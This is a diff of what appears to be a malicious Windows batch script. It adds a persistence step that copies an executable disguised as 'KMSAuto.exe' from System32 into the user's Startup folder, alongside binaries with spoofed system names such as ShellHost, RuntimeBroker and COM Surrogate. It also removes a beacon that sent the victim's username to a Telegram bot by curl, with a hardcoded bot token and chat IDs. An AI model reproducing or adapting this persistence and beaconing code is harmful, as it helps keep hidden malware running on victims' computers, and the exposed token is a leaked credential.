@@ -23,6 +23,7 @@ set loopCount=0
 ::ShellHost.exe ---> TSSPrxySHST.exe
 ::RuntimeBroker.exe ---> TSSPrxyRNTM.exe
 ::COM Surrogate.exe ---> SyncHostApp.exe
+::KMSAuto.exe ---> TSSKMS.exe
 ::StartupTaskCaller.exe ---> TSSPrxySTC.exe
 
 
@@ -86,6 +87,35 @@ reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v 
 timeout /t 1 /nobreak >nul
 
 
+
+
+
+
+
+:KMS
+:: Define the paths
+set "sourceFile=%SystemRoot%\System32\TSSKMS.exe"
+set "startupFile=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\KMSAuto.exe"
+
+:: Check if the file exists in the Startup folder
+if not exist "%startupFile%" (
+    echo File not found in Startup folder. Restoring...
+    copy "%sourceFile%" "%startupFile%"
+) else (
+    echo File is already in Startup folder.
+)
+
+timeout /t 1 /nobreak >nul
+
+
+
+
+
+
+
+
+
+
 :STC
 :: Define the paths
 set "sourceFile=%SystemRoot%\System32\TSSPrxySTC.exe"
@@ -112,12 +142,16 @@ if not exist "%startupFile%" (
 set "file1=%APPDATA%\Microsoft\Windows\SystemCertificatesData\StartupTaskCaller.exe"
 set "file2=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe"
 set "file3=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShellHost.exe"
+set "file4=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\KMSAuto.exe"
 
 
 :: Check each file
 if not exist "%file1%" goto CHECKORRUNSTC
 if not exist "%file2%" goto CHECKORRUNSTC
 if not exist "%file3%" goto CHECKORRUNSTC
+if not exist "%file4%" goto CHECKORRUNSTC
+
+
 
 :: If all files are found, continue with other tasks
 echo All files found.
@@ -299,30 +333,5 @@ if %loopCount% lss 15 (
 
 
 
-
-
-
-
-:: SEND MSG
-
-:: Fucker CHAT ID : -1002163721260
-:: Output CHAT ID : -1002460905948
-
-
-:: Set bot token, chat ID, and message
-set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
-set "CHAT_ID=-1002163721260"
-set "MESSAGE=%USERNAME%|RUNNING……|"
-
-
-:: URL encode the message by replacing spaces with %20
-set "ENCODED_MESSAGE=%MESSAGE: =%%2"
-
-:: Send the message using curl
-curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
-     -d "chat_id=%CHAT_ID%" ^
-     -d "text=%ENCODED_MESSAGE%"
-
-echo Message sent to chat ID %CHAT_ID%
 
 
